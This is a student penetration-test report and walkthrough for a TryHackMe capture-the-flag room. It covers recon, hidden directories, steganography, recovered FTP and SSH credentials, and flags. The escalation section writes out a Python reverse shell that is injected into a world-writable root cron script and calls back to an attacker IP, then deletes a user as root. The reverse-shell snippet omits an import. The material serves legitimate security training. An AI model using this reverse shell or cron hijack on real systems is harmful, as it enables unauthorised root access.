# Psycho Break
## Web application pentest
### Subject
Web application pentest of machine [Psycho Break](https://tryhackme.com/room/psychobreak)
### Date
12-05-2023
### Location
Anywhere
### Auditors
farix
### Version
1.0


## Table of content
1. Executive Summary
   - Synopsis
   - Scope
   - Key Findings
   - Recommendations
2. List of Findings
3. Finding
   - Task1
   - Task2
   - Task3
   - Task4
   - Task5
4. Walkthrough


## 1. Executive Summary
This document is a summary of last part of course in SDA, namely work with Web Application Pentesting. The main goal is to achive all keys and flag in this room to complete the tasks. Also, we need to find vulnerabilities, describe it and find solution to prevent them.
I was able to find few (7) vulnerabilites and finally get root privileges what gives me full control of machine. Individually severe of them is relatively low, but in advantageous conditions and with appropriate person could lead to compromise the machine. Recommendation are pleasd to put into practice.

## 2. List of Findings
* Open port 21 (ftp)
* Banner Grabbing
* Comments (important information)
* Directory Listing Vulnerability
* Credentials in non-secure file/place
* Sensitive data/application on ftp server
* Vulnerability in crontab

## 3. Findings
### Task1
#### Title \#1
Open FTP port
#### Description
In my scan I found opened port 21 (ftp). All transmited data through this port are send in plain text. When attacker obtain access to transmited data i.e. in method MIDM (Man-In-The-Middle) can easy uncover sensitive data.
#### Recommendations
Turn off ftp service at all and use other method. SFTP (SSH FTP), SCP (Secure Copy), etc.

#### Title \#2
Banner Grabbing
#### Description 
Port Scanning shows that attacker can easy uncover types and versions of applications installed on the system and system itself, gather this information and then use if to prepare relevant manner of attack.
#### Recommendations
If not really necessery turn off displaying names and versions of installed application or change it a bit.

### Task2
#### Title \#1
Comments (important information)
#### Description 
Leaving important information in comment on the page is dangerous and must be to konw that anyone can read it.
#### Recommendations
Write carefully your comments and don't leave there important information.

#### Title \#2
Directory Listing Vulnerability
#### Description 
Browser is able to show list of files (and/or directories) is chosen directory
#### Recommendations
Create blank index.html and place in each directory. This will prevent directory listing and display blank page in web browser. Pure method. Better way is to disable directory listing for entire application. In needed, create a directory and enable directory listing only for that alone. All web servers have these options to configure.

### Task3
#### Title
Credentials in non-secure file/place
#### Description
I found credentials in a file written as a plain text. This is not good idea to store sensitive data.
#### Recommendations
Don't keep sensitive data such as credentials in plain text. Use i.e. Password Managers

### Task4
#### Title
Sensitive data/application on ftp server
#### Description 
There is potentially risk of leakage sensitive data.
#### Recommendations
If needed, try to secure them with password or put them through more secure service.

### Task5
#### Title
Vulnerability in crontab
#### Description
In crontab there is a python scirpt runs every 2 minutes with root privileges. When do so, take care that no one but root can write into this file.
#### Recommendations
Change permission so, only root (owner) has access to write into this file `chmod 700 /var/.the_eye_of_ruvik.py`

## 4. Walkthrough
### Task1 - Recon
As we can read at the beginning this room was based on a video game called evil within. So try this out!
Deploy the machine and start Reconnaissance.

`Write ip address of machine to /etc/hosts to use friendly name instead of ip address`

Add line to /etc/hosts
```
10.10.227.164   psychobreak.sda
```

Start to scan:

```
sudo nmap -sSCV -T4 -A -oA nmap_scan psychobreak.sda

```
As a result of above commend we get opened ports with banner info and operating system name.
```
21/tcp open  ftp     ProFTPD 1.3.5a
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

```

Answer the questions:

Deploy the machine.
`No answer needed`

How many ports are open?
`3`

What is the operating system that runs on the target machine?
`Ubuntu`
### Task2 - Web
Open site `psychobreak.sda` in browser

![Start Page](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/01_start_page.png)

Nothing special, try to look, what in source page is.
```
...
<div class="center-wrapper">
		<img src="hospital.png">
	</div>

	<red><!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->

	<br>
...
```

I found a hint in source, namely hidden directory /sadistRoom

![sadistRoom](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/02_sadistroom_page.png)

and a key to locker Room. 
`Key to locker Room => 532219a04ab7a02b56faafbec1a4c1ea`

Enter the key on the next page, be hurry before \"Sebastian is dead\". Click \"Go to Locker Room\"

![Enter the key here](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/04_key_enter_page.png)

Now, we have another page \"Locker Room\". We neet to decode text: \"Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv\" before we could go further.

Trying base64, Caesar Cipher, nothing. As a result of searching it follows that it is a `atbash code`: https://www.geeksforgeeks.org/implementing-atbash-cipher/

I modified python script (from page: https://www.geeksforgeeks.org/implementing-atbash-cipher/) to decode the string. I got key to map: Grant_me_access_to_the_map_please
After entering code on next page, got the **map**.

![Here is the map](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/06.map_page.png)

Let's visit next room: Safe Heaven
![Safe Heaven](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/07_safe_heaven_page.png)

In source page I found another comment: `<!-- I think I'm having a terrible nightmare. Search through me and find it ... -->`

Probably, there are other hidden dirs. Let's find them with gobuster
```
gobuster dir -u http://psychobreak.sda/SafeHeaven/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
gobuster found two other dirs:
```
===============================================================
2023/05/12 11:18:01 Starting gobuster in directory enumeration mode
===============================================================
/imgs                 (Status: 301) [Size: 328] [--> http://psychobreak.sda/SafeHeaven/imgs/]
/keeper               (Status: 301) [Size: 330] [--> http://psychobreak.sda/SafeHeaven/keeper/]
Progress: 220478 / 220561 (99.96%)
===============================================================
2023/05/12 11:37:42 Finished

```
Open page: psychobreak.sda/SafeHeaven/keeper/

![The Keeper](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/08_keeper_page.png)

Press `Escape Keeper` and I have 1min45sec to find what this place is. Let's use google to reverse search the name of image. 

![Reverse search](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/09_safe_yourself_page.png)

Result: `St. Augustine lighthouse`

After correct answer, we got another key: The Keeper Key
`Here is your key : 48ee41458eb0b43bf82b986cecf3af01`

**Notice** the address bar
![file name](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/10_keeper_address_bar.png)

Back to the map and open the last room: Abandoned Room
At the beginning, we need to enter early found Keeper Key. Abandoned Room page appeared. In source code nothing, so press button \"Go Further\".
![Go Further](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/11_abandoned_room_page.png)

There is a shell? Comment in source page say so:
`<!-- There is something called "shell" on current page maybe that'll help you to get out of here !!!-->`

Try to run different commands. Only `ls` and `ls ..` works:
![ls](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/13_ls_command.png)
![ls ..](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/14_ls_up_command.png)

After some combinations with dirs I was able to uncover unprotected dir that shows files inside.

`http://psychobreak.sda/abandonedRoom/680e89809965ec41e64dc7e447f175ab/`

![Index of dir](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/15_index_of_hidden_dir.png)

Gratulations! you made it:)

### Task3 - Help Mee
Download and unzip helpme.zip file.
```
unzip helpme.zip
```
We have two files:
- helpme.txt
- Table.jpg

Form file helpme.txt we know, there is two usernames:
- joseph
- ruvik
```
"From Joseph,

Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell
. I'll tell you what happened when I am out of this cell."
```
Table.jpg isn't picture file. We can proof that with command: `file`
```
file Table.jpg (not image)
Table.jpg: Zip archive data, at least v2.0 to extract, compression method=deflate
```
Let's change the extension and unzip it again:
```
mv Table.jpg Table.zip
unzip Table.zip
Archive:  Table.zip
  inflating: Joseph_Oda.jpg
  inflating: key.wav
```
We have two another files.
Ensure these are proper files:
```
file Joseph_Oda.jpg 
Joseph_Oda.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 350x490, components 3

```
```
file key.wav       
key.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 8 bit, mono 8000 Hz
```

In jpg file could be hide other file using steganography. To unhide this file usually we need a passphrase (key). Second file is named as \'key\'. So let's start with this.

This is morse alphabet. Let's decode from this website: https://morsecode.world/international/decoder/audio-decoder-adaptive.html
After upload and play I got key: **SHOWME**.

![Morse Decoder](https://github.com/farixus/projekt4-web-app-pentests/blob/main/screenshots_psychobreak/16_morse_decoder.png)

Let's take the image. Use steghide to unhide the secret and use key: SHOWME
```
steghide --extract -sf Joseph_Oda.jpg
Enter passphrase:
wrote extracted data to "thankyou.txt".
```
```
cat thankyou.txt

From joseph,

Thank you so much for freeing me out of this cell. Ruvik is nor good, he told me that his going to kill sebastian an
d next would be me. You got to help
Sebastian ... I think you might find Sebastian at the Victoriano Estate. This note I managed to grab from Ruvik migh
t help you get inn to the Victoriano Estate.
But for some reason there is my name listed on the note which I don't have a clue.

           --------------------------------------------
        //                                              \\
        ||      (NOTE) FTP Details                      ||
        ||      ==================                      ||
        ||                                              ||
        ||      USER : joseph                           ||
        ||      PASSWORD : intotheterror445             ||
        ||                                              ||
        \\                                              //
           --------------------------------------------
```

After all this path finally we have credentials to ftp serever:

user: joseph
password: intotheterror445

Answer the questions:
Who is locked up in the cell?
`joseph`

There is something weird with the .wav file. What does it say?
`SHOWME`

What is the FTP Username
`joseph`

What is the FTP User Password
`intotheterror445`

### Task4 - Crack it open
From previous chapter we obtained credentials:

user: joseph
password: intotheterror445

let's use it and connect to ftp server
```
ftp psychobreak.sda
Connected to psychobreak.sda.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.122.128]
Name (psychobreak.sda:kali): joseph
331 Password required for joseph
Password: 
'230 User joseph logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||56083|)
150 Opening ASCII mode data connection for file list
-rwxr-xr-x   1 joseph   joseph   11641688 Aug 13  2020 program
-rw-r--r--   1 joseph   joseph        974 Aug 13  2020 random.dic
226 Transfer complete
ftp> mget *
mget program [anpqy?]? y
229 Entering Extended Passive Mode (|||40360|)
150 Opening BINARY mode data connection for program (11641688 bytes)
100% |***********************************************************************| 11368 KiB    2.15 MiB/s    00:00 ETA
226 Transfer complete
11641688 bytes received in 00:05 (2.12 MiB/s)
mget random.dic [anpqy?]? y
229 Entering Extended Passive Mode (|||44848|)
150 Opening BINARY mode data connection for random.dic (974 bytes)
100% |***********************************************************************|   974      654.62 KiB/s    00:00 ETA
226 Transfer complete
974 bytes received in 00:00 (16.74 KiB/s)
ftp> 
```

I was able to login and download two files:
- program
- random.dic

```
└─$ file program       
program: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=294d1f19a085a730da19a6c55788ec08c2187039, stripped
                                                                                                                    
└─$ file random.dic                     
random.dic: ASCII text, with CRLF line terminators
```

It seems that `program` is exe file and `random.dic` is a dictionary. To run `program` we need to set apropriate permission:
```
chmod 777 ./program
```
and use dictionary `random.dic` as a parameter in call `program` word by word. I used followed one-liner:
```
while read LINE; do ./program $LINE; done < words.txt
```
It turned out that we must convert `random.dic` with strings command:
```
strings random.dic > words.txt
```

Output of execution `program` is:
```
killer => Incorrect

kidman => Correct

Well Done !!!
Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33

letmein => Incorrect
```
Another code is strange:) Few minutes later I saw that it is **keypad code** as follows:

2 = A

22 = B

222 = C

3 = D

and so on
After all, we have a next key: KIDMANSPASSWORDISSOSTRANGE

Answer the questions:
The key used by the program
`kidman`

What do the crazy long numbers mean when there decrypted.
`KIDMANSPASSWORDISSOSTRANGE`

### Task5 - Go Capture The Flag

We have to phrases:
kidman and KIDMANSPASSWORDISSOSTRANGE

Let's try them as a credentials in ssh service:

We succeeded!
```
ssh kidman@psychobreak.sda    
The authenticity of host 'psychobreak.sda (10.10.122.128)' can't be established.
ED25519 key fingerprint is SHA256:qoY32nnMdG9yk5zI+QyqHzXgNPBhVdbcfy/QUOwogfo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:18: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'psychobreak.sda' (ED25519) to the list of known hosts.
kidman@psychobreak.sda's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

171 packages can be updated.
121 updates are security updates.


Last login: Fri Aug 14 22:28:13 2020 from 192.168.1.5
kidman@evilwithin:~$ 
```
In home directory I found file user.txt, where was first flag: 
```
kidman@evilwithin:~$ cat user.txt 
4C72A4EF8E6FED69C72B4D58431C4254
```
Now, we need to escalate privileges to obtain root's flag.

I was able to use `wget` on compromised machine and get on-the-run created http server script `linpeas.sh` to examine compromised machine.

A few interesting thngs were found:
- strange file: /home/kidman/.the_eye.txt
- list of users:
  - uid=1001(joseph) gid=1001(joseph) groups=1001(joseph)
  - uid=1002(kidman) gid=1002(kidman) groups=1002(kidman)
  - uid=1003(ruvik) gid=1003(ruvik) groups=1003(ruvik)
- entry in /etc/crontab
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

*/2 * * * * root python3 /var/.the_eye_of_ruvik.py
```
After verifying
```
kidman@evilwithin:~$ ls -al /var/.the_eye_of_ruvik.py 
-rwxr-xrw- 1 root root 300 Aug 14  2020 /var/.the_eye_of_ruvik.py
```
We are able to write to `/var/.the_eye_of_ruvik.py` and as we see above it is run every 2 minutes with root rights.

Let's add reverse shell to this file, ana locally set listener to receive the shell.
```
kidman@evilwithin:~$ nano /var/.the_eye_of_ruvik.py 
```
add this line in python:
```
import os
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.100.35",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

and on attacker machine after max 2 minutes we got root shell:
```
nc -nlvp 1234   
listening on [any] 1234 ...
connect to [10.8.100.35] from (UNKNOWN) [10.10.122.128] 56566
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

Now it's easy to obtain root flag:
```
# cat root.txt
BA33BDF5B8A3BFC431322F7D13F3361E
```
and run additional command to defeat user: Ruvik

* BEFORE DELETE
```
# cat /etc/passwd

...
ftp:x:112:65534::/srv/ftp:/bin/false
kidman:x:1002:1002:kidman,,,:/home/kidman/:/bin/bash
ruvik:x:1003:1003:ruvik,,,:/home/ruvik/:/bin/bash
```
* RUN COMMAND
```
deluser --remove-all-files ruvik
```
* AFTER DELETE
```
# cat /etc/passwd

...
ftp:x:112:65534::/srv/ftp:/bin/false
kidman:x:1002:1002:kidman,,,:/home/kidman/:/bin/bash
```


